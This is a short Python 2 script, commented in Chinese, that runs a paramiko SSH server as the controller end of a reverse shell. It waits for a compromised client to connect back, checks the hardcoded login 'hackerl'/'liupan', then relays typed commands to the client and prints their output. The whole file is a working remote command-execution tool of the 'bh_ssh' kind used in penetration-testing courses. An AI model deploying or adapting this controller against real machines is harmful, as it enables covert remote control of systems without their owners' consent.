#!/usr/bin/python
#-*- coding:utf-8 -*-
#SSH服务器，反向连接执行命令

import paramiko
import socket
import threading
import sys
from binascii import hexlify
#加载SSH服务器密钥，以进行认证
host_key=paramiko.RSAKey(filename='/root/.ssh/id_rsa')

#继承服务基类
class Server(paramiko.ServerInterface):
    def _init_(self):
        self.event=threading.Event()
    def check_channel_request(self,kind,chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    #设置登录密码，可在此连接数据库，进行认证
    def check_auth_password(self,username,password):
        if (username=='hackerl') and (password == 'liupan'):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
#监听地址
server=sys.argv[1]
ssh_port = int(sys.argv[2])

#套接字监听
try:
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    sock.bind((server,ssh_port))
    sock.listen(100)
    print '[+]Listening for connection ....'
    client,addr=sock.accept()
except Exception,e:
    print '[-]listen failed: '+str(e)
    sys.exit(0)
print '[+]got a connection!'

try:
    #将连接的套接字进行SSH隧道加密
    bhSession=paramiko.Transport(client)
    bhSession.add_server_key(host_key)
    server=Server()
    try:
        #加载服务核心，进行认证
        bhSession.start_server(server=server)
    except paramiko.SSHException,x:
        print '[-]SSH negotiation failed!'
    #channel传输数据
    chan = bhSession.accept()
    print '[+] Authenticated!'
    print chan.recv(1024)
    chan.send('Welcome to bh_ssh')
    while True:
        try:
            command=raw_input(">>> command:").strip('\n')
            if command != 'exit':
                chan.send(command)
                print chan.recv(10240)
            else:
                chan.send('exit')
                print 'exiting'
                bhSession.close()
                raise Exception('exit')
        except KeyboardInterrupt:
            bhSession.close()
except Exception,e:
    print '[-] Caught exception: '+str(e)
    try:
        bhSession.close()
    except:
        pass
    sys.exit(0)    
